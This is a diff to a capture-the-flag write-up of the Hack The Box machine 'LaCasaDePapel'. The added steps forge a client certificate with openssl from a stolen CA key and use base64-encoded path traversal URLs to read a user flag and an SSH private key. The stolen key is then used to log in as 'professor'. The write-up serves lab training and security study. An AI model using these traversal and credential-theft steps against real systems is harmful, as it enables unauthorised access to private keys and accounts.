@@ -116,6 +116,7 @@ scandir('/home');
 If we list the contents of each users home directory, we will see a couple things.
 - The user flag is located in <b>/home/berlin</b>
 - There is a  <b>ca.key</b> file located at <b>/home/nairobi</b>
+
 ```
 scandir('/home/berlin');
 => [
@@ -199,7 +200,54 @@ aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
 53udBEzjt3WPqYGkkDknVhjD
 -----END PRIVATE KEY-----
 ```
-Now the next step is to grab the <b>.crt</b> file from your web browser. in firfox navigate to <b>Preferences > Privacy and Security > View Certificates</b>. Once there, in the top right click on <b>Authorities</b> and scroll down until you see the certificate for <b>lacasadepapel.htb</b>
+Now the next step is to grab the <b>.crt</b> file from your web browser. in firefox navigate to <b>Preferences > Privacy and Security > View Certificates</b>. Once there, in the top right click on <b>Authorities</b> and scroll down until you see the certificate for <b>lacasadepapelhtb.htb</b> and then import/download it to you host machine.
 
 <center><img src="/htb/lacasadepapel/certificate.png"></center>
 <br>
+Now we need to create our client certificate. To do this we will use <b>openssl</b> in combination with our <b>ca.key</b> file and <b>lacasadepapelhtb.crt</b> file. It will ask you for a password, just leave it blank.
+```
+# openssl pkcs12 -export -clcerts -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapel.p12
+Enter Export Password:
+Verifying - Enter Export Password:
+```
+Now we need to import the <b>lacasadepapel.p12</b> into firefox. Go back to <b>Preferences > Privacy and Security > View Certificates</b> except this time choose <b>Your Certificates</b>. Then choose import and select the certificate.
+
+<center><img src="/htb/lacasadepapel/p12.png"></center>
+<br>
+Now if we go back to the webpage and refresh it, we no longer get the client certificate error.
+
+<center><img src="/htb/lacasadepapel/in.png"></center>
+<br>
+Looking through all the <b>avi</b> files I dont find anything since they are all empty but I looking a the source code of the webpage does reveal something interesting at the bottom. We see some files stored in a <b>/file</b> directory with files that look like they are encoded in base64. Using this we can do 2 things:
+-Grab the user flag in <b>/home/berlin</b>
+-Grab an ssh private key from <b>/home/berlin/.ssh/id_rsa</b> and log in with it
+```
+# echo -n "../../../../home/berlin/user.txt" | base64
+Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=
+
+https://10.10.10.131/file/Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=
+```
+<center><img src="/htb/lacasadepapel/flag.png"></center>
+<br>
+Now we grab the ssh key
+```
+# echo -n "../../../../home/berlin/.ssh/id_rsa" | base64
+Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
+
+https://10.10.10.131/file/Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
+```
+<center><img src="/htb/lacasadepapel/key.png"></center>
+<br>
+Now my first thought was to SSH in as the user <b>berlin</b> since that is where we found the key but it didnt work. I decided to try the other users and it ended up working with the user <b>professor</b>
+```
+# ssh -i id_rsa professor@10.10.10.131
+
+ _             ____                  ____         ____                  _
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$
+```
